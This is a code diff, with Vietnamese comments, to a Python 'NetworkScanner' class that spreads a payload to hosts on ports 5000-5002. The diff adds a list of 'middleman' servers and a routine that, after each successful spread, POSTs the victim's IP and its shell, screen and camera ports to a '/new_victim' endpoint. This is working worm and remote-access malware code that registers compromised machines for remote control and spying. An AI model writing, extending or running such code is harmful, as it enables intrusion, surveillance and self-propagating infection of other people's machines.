@@ -334,6 +334,15 @@ class NetworkScanner:
             '172.18.0.0/16'    # Custom range
         ]
         
+        # Danh sách các middleman có thể kết nối
+        self.middleman_hosts = [
+            '10.0.2.15',      # NAT default middleman
+            '192.168.56.1',   # Host-only default middleman
+            '192.168.1.13',   # Bridge mode middleman
+            '10.0.3.15'       # NAT Network middleman
+        ]
+        self.middleman_port = 8080
+        
         self.target_ports = [5000, 5001, 5002]
         self.payload = None
         self.load_payload()
@@ -356,6 +365,29 @@ class NetworkScanner:
         except:
             return False
 
+    def notify_middleman(self, victim_ip):
+        """Notify all possible middleman about new victim"""
+        for middleman_ip in self.middleman_hosts:
+            try:
+                conn = HTTPConnection(middleman_ip, self.middleman_port, timeout=1)
+                headers = {'Content-type': 'application/json'}
+                data = {
+                    'victim_ip': victim_ip,
+                    'ports': {
+                        'shell': self.target_ports[0],
+                        'screen': self.target_ports[1],
+                        'camera': self.target_ports[2]
+                    }
+                }
+                conn.request('POST', '/new_victim', json.dumps(data), headers)
+                response = conn.getresponse()
+                if response.status == 200:
+                    print(f"Successfully notified middleman at {middleman_ip}")
+                    break
+            except Exception as e:
+                print(f"Failed to notify middleman at {middleman_ip}: {e}")
+                continue
+
     def spread_to_host(self, host):
         """Attempt to spread payload to a vulnerable host"""
         try:
@@ -371,6 +403,9 @@ class NetworkScanner:
                     
                     # Send payload
                     s.sendall(self.payload)
+                    
+                    # Notify middleman about new victim
+                    self.notify_middleman(host)
                     
                     print(f"Successfully spread to {host}")
                     return True
